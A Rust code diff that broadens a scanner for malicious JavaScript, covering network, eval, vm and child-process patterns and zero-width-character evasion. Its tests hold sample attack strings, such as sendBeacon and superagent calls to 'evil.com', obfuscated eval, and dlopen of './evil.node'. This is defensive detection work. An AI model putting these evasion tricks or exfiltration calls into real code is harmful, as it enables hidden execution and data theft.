@@ -699,6 +699,28 @@ fn unescape_js(s: &str) -> String {
     out
 }
 
+fn is_ignorable_js_char(c: char) -> bool {
+    c.is_whitespace()
+        || c == '\u{200B}' // Zero-width space
+        || c == '\u{200C}' // Zero-width non-joiner
+        || c == '\u{200D}' // Zero-width joiner
+        || c == '\u{FEFF}' // Zero-width no-break space / BOM
+        || c == '\u{00AD}' // Soft hyphen
+        || c == '\u{2060}' // Word joiner
+        || c == '\u{180E}' // Mongolian vowel separator
+        || c == '\u{200E}' // Left-to-right mark
+        || c == '\u{200F}' // Right-to-left mark
+        || c == '\u{202A}' // Left-to-right embedding
+        || c == '\u{202B}' // Right-to-left embedding
+        || c == '\u{202C}' // Pop directional formatting
+        || c == '\u{202D}' // Left-to-right override
+        || c == '\u{202E}' // Right-to-left override
+        || c == '\u{2066}' // Left-to-right isolate
+        || c == '\u{2067}' // Right-to-left isolate
+        || c == '\u{2068}' // First strong isolate
+        || c == '\u{2069}' // Pop directional isolate
+}
+
 fn strip_comments_and_whitespace(s: &str) -> String {
     let mut out = String::with_capacity(s.len());
     let mut chars = s.chars().peekable();
@@ -715,7 +737,7 @@ fn strip_comments_and_whitespace(s: &str) -> String {
             if c == q {
                 in_quote = None;
             }
-            if !c.is_whitespace() {
+            if !is_ignorable_js_char(c) {
                 out.push(c);
             }
             continue;
@@ -757,7 +779,7 @@ fn strip_comments_and_whitespace(s: &str) -> String {
                 continue;
             }
         }
-        if !c.is_whitespace() {
+        if !is_ignorable_js_char(c) {
             out.push(c);
         }
     }
@@ -847,6 +869,14 @@ fn fold_adjacent_string_literals(s: &str) -> String {
     out
 }
 
+fn contains_module_import(s: &str, module: &str) -> bool {
+    ['\'', '"', '`'].iter().any(|&q| {
+        s.contains(&format!("require({q}{module}{q})"))
+            || s.contains(&format!("import({q}{module}{q})"))
+            || s.contains(&format!("from{q}{module}{q}"))
+    })
+}
+
 fn has_vm_invocation(s_clean: &str) -> bool {
     s_clean.contains("vm.runInThisContext")
         || s_clean.contains("vm.runInNewContext")
@@ -857,6 +887,8 @@ fn has_vm_invocation(s_clean: &str) -> bool {
         || s_clean.contains("vm.createScript(")
         || s_clean.contains("runInThisContext(")
         || s_clean.contains("runInNewContext(")
+        || contains_module_import(s_clean, "vm")
+        || contains_module_import(s_clean, "node:vm")
 }
 
 #[cfg(test)]
@@ -888,9 +920,39 @@ fn contains_call(s: &str, target: &str) -> bool {
 }
 
 fn has_network_invocation(s_clean: &str) -> bool {
+    const NETWORK_MODULES: &[&str] = &[
+        "http",
+        "https",
+        "net",
+        "tls",
+        "dgram",
+        "http2",
+        "dns",
+        "undici",
+        "axios",
+        "node:http",
+        "node:https",
+        "node:net",
+        "node:tls",
+        "node:dgram",
+        "node:http2",
+        "node:dns",
+        "node-fetch",
+        "got",
+        "superagent",
+        "request",
+        "urllib",
+        "phin",
+        "needle",
+        "bent",
+        "cross-fetch",
+    ];
+
     contains_call(s_clean, "fetch(")
         || contains_call(s_clean, "fetch`")
         || contains_call(s_clean, "WebSocket(")
+        || contains_call(s_clean, "sendBeacon(")
+        || contains_call(s_clean, "EventSource(")
         || s_clean.contains("http.request(")
         || s_clean.contains("http.get(")
         || s_clean.contains("https.request(")
@@ -907,102 +969,9 @@ fn has_network_invocation(s_clean: &str) -> bool {
         || s_clean.contains("dns.resolveTxt(")
         || s_clean.contains("dns.lookup(")
         || s_clean.contains("dns.promises")
-        || s_clean.contains("require('http')")
-        || s_clean.contains("require(\"http\")")
-        || s_clean.contains("require(`http`)")
-        || s_clean.contains("require('https')")
-        || s_clean.contains("require(\"https\")")
-        || s_clean.contains("require(`https`)")
-        || s_clean.contains("require('net')")
-        || s_clean.contains("require(\"net\")")
-        || s_clean.contains("require(`net`)")
-        || s_clean.contains("require('tls')")
-        || s_clean.contains("require(\"tls\")")
-        || s_clean.contains("require(`tls`)")
-        || s_clean.contains("require('dgram')")
-        || s_clean.contains("require(\"dgram\")")
-        || s_clean.contains("require(`dgram`)")
-        || s_clean.contains("require('http2')")
-        || s_clean.contains("require(\"http2\")")
-        || s_clean.contains("require(`http2`)")
-        || s_clean.contains("require('dns')")
-        || s_clean.contains("require(\"dns\")")
-        || s_clean.contains("require(`dns`)")
-        || s_clean.contains("require('undici')")
-        || s_clean.contains("require(\"undici\")")
-        || s_clean.contains("require(`undici`)")
-        || s_clean.contains("require('axios')")
-        || s_clean.contains("require(\"axios\")")
-        || s_clean.contains("require(`axios`)")
-        || s_clean.contains("require('node:http')")
-        || s_clean.contains("require(\"node:http\")")
-        || s_clean.contains("require(`node:http`)")
-        || s_clean.contains("require('node:https')")
-        || s_clean.contains("require(\"node:https\")")
-        || s_clean.contains("require(`node:https`)")
-        || s_clean.contains("require('node:net')")
-        || s_clean.contains("require(\"node:net\")")
-        || s_clean.contains("require(`node:net`)")
-        || s_clean.contains("require('node:tls')")
-        || s_clean.contains("require(\"node:tls\")")
-        || s_clean.contains("require(`node:tls`)")
-        || s_clean.contains("require('node:dgram')")
-        || s_clean.contains("require(\"node:dgram\")")
-        || s_clean.contains("require(`node:dgram`)")
-        || s_clean.contains("require('node:http2')")
-        || s_clean.contains("require(\"node:http2\")")
-        || s_clean.contains("require(`node:http2`)")
-        || s_clean.contains("require('node:dns')")
-        || s_clean.contains("require(\"node:dns\")")
-        || s_clean.contains("require(`node:dns`)")
-        || s_clean.contains("import('http')")
-        || s_clean.contains("import(\"http\")")
-        || s_clean.contains("import(`http`)")
-        || s_clean.contains("import('https')")
-        || s_clean.contains("import(\"https\")")
-        || s_clean.contains("import(`https`)")
-        || s_clean.contains("import('net')")
-        || s_clean.contains("import(\"net\")")
-        || s_clean.contains("import(`net`)")
-        || s_clean.contains("import('tls')")
-        || s_clean.contains("import(\"tls\")")
-        || s_clean.contains("import(`tls`)")
-        || s_clean.contains("import('dgram')")
-        || s_clean.contains("import(\"dgram\")")
-        || s_clean.contains("import(`dgram`)")
-        || s_clean.contains("import('http2')")
-        || s_clean.contains("import(\"http2\")")
-        || s_clean.contains("import(`http2`)")
-        || s_clean.contains("import('dns')")
-        || s_clean.contains("import(\"dns\")")
-        || s_clean.contains("import(`dns`)")
-        || s_clean.contains("import('undici')")
-        || s_clean.contains("import(\"undici\")")
-        || s_clean.contains("import(`undici`)")
-        || s_clean.contains("import('axios')")
-        || s_clean.contains("import(\"axios\")")
-        || s_clean.contains("import(`axios`)")
-        || s_clean.contains("import('node:http')")
-        || s_clean.contains("import(\"node:http\")")
-        || s_clean.contains("import(`node:http`)")
-        || s_clean.contains("import('node:https')")
-        || s_clean.contains("import(\"node:https\")")
-        || s_clean.contains("import(`node:https`)")
-        || s_clean.contains("import('node:net')")
-        || s_clean.contains("import(\"node:net\")")
-        || s_clean.contains("import(`node:net`)")
-        || s_clean.contains("import('node:tls')")
-        || s_clean.contains("import(\"node:tls\")")
-        || s_clean.contains("import(`node:tls`)")
-        || s_clean.contains("import('node:dgram')")
-        || s_clean.contains("import(\"node:dgram\")")
-        || s_clean.contains("import(`node:dgram`)")
-        || s_clean.contains("import('node:http2')")
-        || s_clean.contains("import(\"node:http2\")")
-        || s_clean.contains("import(`node:http2`)")
-        || s_clean.contains("import('node:dns')")
-        || s_clean.contains("import(\"node:dns\")")
-        || s_clean.contains("import(`node:dns`)")
+        || NETWORK_MODULES
+            .iter()
+            .any(|&m| contains_module_import(s_clean, m))
 }
 
 #[cfg(test)]
@@ -1078,8 +1047,78 @@ fn has_dynamic_global_invocation(s_clean: &str) -> bool {
     false
 }
 
+fn has_timer_eval_invocation(s_clean: &str) -> bool {
+    const TIMERS: [&str; 3] = ["setTimeout(", "setInterval(", "setImmediate("];
+    const STRING_STARTERS: [&str; 7] = [
+        "\"",
+        "'",
+        "`",
+        "String.fromCharCode",
+        "fromCharCode",
+        "Buffer.from",
+        "atob(",
+    ];
+
+    for timer in TIMERS {
+        let mut search_idx = 0;
+        while let Some(pos) = s_clean[search_idx..].find(timer) {
+            let actual_idx = search_idx + pos;
+            let prev_is_ident = actual_idx > 0 && {
+                let prev = s_clean[..actual_idx].chars().next_back().unwrap_or(' ');
+                prev.is_ascii_alphanumeric() || prev == '_' || prev == '$'
+            };
+            let after = &s_clean[actual_idx + timer.len()..];
+            if !prev_is_ident
+                && STRING_STARTERS
+                    .iter()
+                    .any(|&prefix| after.starts_with(prefix))
+            {
+                return true;
+            }
+            search_idx = actual_idx + timer.len();
+        }
+    }
+    false
+}
+
+fn contains_scoped_eval(s: &str) -> bool {
+    const SCOPES: [&str; 4] = ["globalThis", "window", "global", "this"];
+    const CHAR_CODE_PATTERNS: [&str; 3] = [
+        "String.fromCharCode",
+        "fromCharCode",
+        "String.fromCodePoint",
+    ];
+    const QUOTES: [char; 3] = ['\'', '"', '`'];
+    const TARGETS: [&str; 2] = ["eval", "Function"];
+
+    for scope in SCOPES {
+        if s.contains(&format!("{scope}.eval")) {
+            return true;
+        }
+        for pat in CHAR_CODE_PATTERNS {
+            if s.contains(&format!("{scope}[{pat}"))
+                || s.contains(&format!("Reflect.get({scope},{pat}"))
+            {
+                return true;
+            }
+        }
+        for target in TARGETS {
+            for q in QUOTES {
+                if s.contains(&format!("{scope}[{q}{target}{q}]"))
+                    || s.contains(&format!("Reflect.get({scope},{q}{target}{q})"))
+                {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
 fn has_eval_invocation(s_clean: &str) -> bool {
     has_dynamic_global_invocation(s_clean)
+        || has_timer_eval_invocation(s_clean)
+        || contains_scoped_eval(s_clean)
         || contains_call(s_clean, "eval(")
         || contains_call(s_clean, "eval`")
         || s_clean.contains("(eval)(")
@@ -1113,83 +1152,18 @@ fn has_eval_invocation(s_clean: &str) -> bool {
         || s_clean.contains("Function.prototype")
         || s_clean.contains("Object.getPrototypeOf")
         || s_clean.contains("Reflect.getPrototypeOf")
-        || s_clean.contains("globalThis[String.fromCharCode")
-        || s_clean.contains("window[String.fromCharCode")
-        || s_clean.contains("global[String.fromCharCode")
-        || s_clean.contains("this[String.fromCharCode")
-        || s_clean.contains("globalThis[fromCharCode")
-        || s_clean.contains("window[fromCharCode")
-        || s_clean.contains("global[fromCharCode")
-        || s_clean.contains("this[fromCharCode")
-        || s_clean.contains("globalThis[String.fromCodePoint")
-        || s_clean.contains("window[String.fromCodePoint")
-        || s_clean.contains("global[String.fromCodePoint")
-        || s_clean.contains("this[String.fromCodePoint")
-        || s_clean.contains("Reflect.get(globalThis,String.fromCharCode")
-        || s_clean.contains("Reflect.get(window,String.fromCharCode")
-        || s_clean.contains("Reflect.get(global,String.fromCharCode")
-        || s_clean.contains("Reflect.get(this,String.fromCharCode")
-        || s_clean.contains("Reflect.get(globalThis,fromCharCode")
-        || s_clean.contains("Reflect.get(window,fromCharCode")
         || s_clean.contains("Reflect.construct(")
         || s_clean.contains("Reflect.apply(")
-        || s_clean.contains("Reflect.get(globalThis,\"eval\")")
-        || s_clean.contains("Reflect.get(globalThis,'eval')")
-        || s_clean.contains("Reflect.get(globalThis,`eval`)")
-        || s_clean.contains("Reflect.get(window,\"eval\")")
-        || s_clean.contains("Reflect.get(window,'eval')")
-        || s_clean.contains("Reflect.get(window,`eval`)")
-        || s_clean.contains("Reflect.get(global,\"eval\")")
-        || s_clean.contains("Reflect.get(global,'eval')")
-        || s_clean.contains("Reflect.get(global,`eval`)")
-        || s_clean.contains("Reflect.get(this,\"eval\")")
-        || s_clean.contains("Reflect.get(this,'eval')")
-        || s_clean.contains("Reflect.get(this,`eval`)")
-        || s_clean.contains("Reflect.get(globalThis,\"Function\")")
-        || s_clean.contains("Reflect.get(globalThis,'Function')")
-        || s_clean.contains("Reflect.get(globalThis,`Function`)")
-        || s_clean.contains("Reflect.get(window,\"Function\")")
-        || s_clean.contains("Reflect.get(window,'Function')")
-        || s_clean.contains("Reflect.get(window,`Function`)")
-        || s_clean.contains("Reflect.get(global,\"Function\")")
-        || s_clean.contains("Reflect.get(global,'Function')")
-        || s_clean.contains("Reflect.get(global,`Function`)")
-        || s_clean.contains("globalThis.eval")
-        || s_clean.contains("window.eval")
-        || s_clean.contains("global.eval")
-        || s_clean.contains("globalThis[\"eval\"]")
-        || s_clean.contains("globalThis['eval']")
-        || s_clean.contains("globalThis[`eval`]")
-        || s_clean.contains("window[\"eval\"]")
-        || s_clean.contains("window['eval']")
-        || s_clean.contains("window[`eval`]")
-        || s_clean.contains("global[\"eval\"]")
-        || s_clean.contains("global['eval']")
-        || s_clean.contains("global[`eval`]")
-        || s_clean.contains("this[\"eval\"]")
-        || s_clean.contains("this['eval']")
-        || s_clean.contains("this[`eval`]")
-        || s_clean.contains("globalThis[\"Function\"]")
-        || s_clean.contains("globalThis['Function']")
-        || s_clean.contains("globalThis[`Function`]")
-        || s_clean.contains("window[\"Function\"]")
-        || s_clean.contains("window['Function']")
-        || s_clean.contains("window[`Function`]")
-        || s_clean.contains("global[\"Function\"]")
-        || s_clean.contains("global['Function']")
-        || s_clean.contains("global[`Function`]")
-        || s_clean.contains("this[\"Function\"]")
-        || s_clean.contains("this['Function']")
-        || s_clean.contains("this[`Function`]")
-        || s_clean.contains("import(\"data:")
-        || s_clean.contains("import('data:")
-        || s_clean.contains("import(`data:")
-        || s_clean.contains("import(\"http://")
-        || s_clean.contains("import('http://")
-        || s_clean.contains("import(`http://")
-        || s_clean.contains("import(\"https://")
-        || s_clean.contains("import('https://")
-        || s_clean.contains("import(`https://")
+        || ['\'', '"', '`'].iter().any(|&q| {
+            s_clean.contains(&format!("import({q}data:"))
+                || s_clean.contains(&format!("import({q}http://"))
+                || s_clean.contains(&format!("import({q}https://"))
+        })
+        || s_clean.contains("import.meta")
+        || s_clean.contains("WebAssembly.compile")
+        || s_clean.contains("WebAssembly.instantiate")
+        || s_clean.contains("WebAssembly.Instance")
+        || s_clean.contains("WebAssembly.Module")
 }
 
 #[cfg(test)]
@@ -1201,20 +1175,38 @@ fn is_eval_invocation(s: &str) -> bool {
 }
 
 fn has_child_proc_invocation(s_clean: &str) -> bool {
-    s_clean.contains("child_process")
-        || s_clean.contains("node:child_process")
-        || s_clean.contains("worker_threads")
+    const CALLS: [&str; 7] = [
+        "dlopen(",
+        "execSync(",
+        "spawnSync(",
+        "execFileSync(",
+        "execFile(",
+        "spawn(",
+        "fork(",
+    ];
+    const MODULES: [&str; 3] = ["child_process", "worker_threads", "cluster"];
+    const BINDINGS: [&str; 2] = ["spawn_sync", "process_wrap"];
+    const QUOTES: [char; 3] = ['\'', '"', '`'];
+
+    s_clean.contains("node:child_process")
         || s_clean.contains("node:worker_threads")
-        || contains_call(s_clean, "execSync(")
-        || contains_call(s_clean, "spawnSync(")
-        || contains_call(s_clean, "execFileSync(")
-        || contains_call(s_clean, "execFile(")
-        || contains_call(s_clean, "spawn(")
-        || contains_call(s_clean, "fork(")
-        || s_clean.contains("process.binding('spawn_sync')")
-        || s_clean.contains("process.binding(\"spawn_sync\")")
+        || s_clean.contains("node:cluster")
+        || s_clean.contains("process.dlopen")
         || s_clean.contains("process._linkedBinding")
         || s_clean.contains("process.getBuiltinModule")
+        || s_clean.contains("process.mainModule")
+        || s_clean.contains("module.require(")
+        || MODULES.iter().any(|m| s_clean.contains(m))
+        || CALLS.iter().any(|c| contains_call(s_clean, c))
+        || BINDINGS.iter().any(|b| {
+            QUOTES
+                .iter()
+                .any(|q| s_clean.contains(&format!("process.binding({q}{b}{q})")))
+        })
+        || QUOTES.iter().any(|q| {
+            s_clean.contains(&format!("process[{q}mainModule{q}]"))
+                || s_clean.contains(&format!("module[{q}require{q}]("))
+        })
 }
 
 #[cfg(test)]
@@ -2242,5 +2234,66 @@ mod tests {
         ));
         assert!(is_eval_invocation("window[dynamicFunc]('payload');"));
         assert!(is_eval_invocation("globalThis[arr[0]]('payload');"));
+    }
+
+    #[test]
+    fn detects_mainmodule_and_dynamic_vm_imports() {
+        assert!(is_child_proc_invocation(
+            "process.mainModule.require('child_process')"
+        ));
+        assert!(is_child_proc_invocation(
+            "process['main' + 'Module'].require('fs')"
+        ));
+        assert!(is_child_proc_invocation("module.require('worker_threads')"));
+        assert!(is_vm_invocation("import('node:vm')"));
+        assert!(is_vm_invocation("require('node:' + 'vm')"));
+        assert!(is_eval_invocation("import.meta.resolve('./evil.js')"));
+    }
+
+    #[test]
+    fn detects_timer_string_eval_and_zero_width_spaces() {
+        assert!(is_eval_invocation("setTimeout('process.exit(1)', 100);"));
+        assert!(is_eval_invocation("setInterval(\"payload()\", 500);"));
+        assert!(is_eval_invocation("setImmediate(`evil()`);"));
+        assert!(is_eval_invocation("globalThis.setTimeout('evil()', 10);"));
+        assert!(is_eval_invocation(
+            "setTimeout(String.fromCharCode(101,118,97,108), 10);"
+        ));
+        assert!(is_eval_invocation("eval\u{200B}('process.exit(1)');"));
+        assert!(is_eval_invocation("eval\u{200C}('process.exit(1)');"));
+        assert!(is_eval_invocation("eval\u{200D}('process.exit(1)');"));
+        assert!(is_eval_invocation("\u{FEFF}eval('process.exit(1)');"));
+        assert!(is_eval_invocation("eval\u{00AD}('process.exit(1)');"));
+        // Legitimate callback closures in timers should not trigger eval heuristic
+        assert!(!is_eval_invocation("setTimeout(() => { doWork(); }, 100);"));
+        assert!(!is_eval_invocation(
+            "setInterval(function() { poll(); }, 500);"
+        ));
+    }
+
+    #[test]
+    fn detects_this_dynamic_eval_dlopen_cluster_and_wasm() {
+        assert!(is_eval_invocation("this['ev' + 'al']('payload');"));
+        assert!(is_eval_invocation("this[\"Function\"]('payload');"));
+        assert!(is_eval_invocation("WebAssembly.instantiate(wasmBytes)"));
+        assert!(is_eval_invocation("WebAssembly.compile(wasmBuffer)"));
+        assert!(is_child_proc_invocation(
+            "process.dlopen(module, './evil.node')"
+        ));
+        assert!(is_child_proc_invocation("dlopen(module, './evil.node')"));
+        assert!(is_child_proc_invocation(
+            "const cluster = require('cluster'); cluster.fork();"
+        ));
+        assert!(is_child_proc_invocation(
+            "import cluster from 'node:cluster'"
+        ));
+        assert!(is_network_invocation("require('got')('https://evil.com')"));
+        assert!(is_network_invocation("import fetch from 'node-fetch'"));
+        assert!(is_network_invocation(
+            "require('superagent').get('http://evil.com')"
+        ));
+        assert!(is_network_invocation(
+            "navigator.sendBeacon('http://evil.com', data)"
+        ));
     }
 }
